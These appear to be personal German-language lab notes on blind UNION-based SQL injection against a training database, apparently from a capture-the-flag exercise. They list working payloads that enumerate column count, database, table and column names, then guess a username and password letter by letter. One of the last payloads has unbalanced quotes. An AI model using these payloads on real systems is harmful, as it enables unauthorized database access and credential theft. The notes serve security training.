url: /username=admin - vorhanden

## spalten der abfrage herausfinden
admin123' UNION SELECT 1;--
admin123' UNION SELECT 1,2;--
admin123' UNION SELECT 1,2.3;--
...

## Datenbankname herausfinden
admin123' UNION SELECT 1,2,3 where database() like '%';--
admin123' UNION SELECT 1,2,3 where database() like 'a%';--
admin123' UNION SELECT 1,2,3 where database() like 'b';--
...

## Tabellenname herausfinden
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--

## Spaltenname herausfinden
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';

### Nachdem man zb eine Spalte 'id' gefunden hat, die man aber nicht braucht, nimmt man den selben Payload und schließt die Spalte 'id' aus
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';

### Wenn man wieder eine Spalte gefunden hat die bam nicht braucht, schließt man sie wieder aus
### irgendwann findet man zb eine Spalte usernames. Dann sucht man den username
admin123' UNION SELECT 1,2,3 from users where username like 'a%

### username 'admin' gefunden. Jetzt gehts ans Passwort
admin123' UNION SELECT 1,2,3 from users where username like 'a% and password like 'a%
#### vorher muss man natürlich die spalte 'password' finden
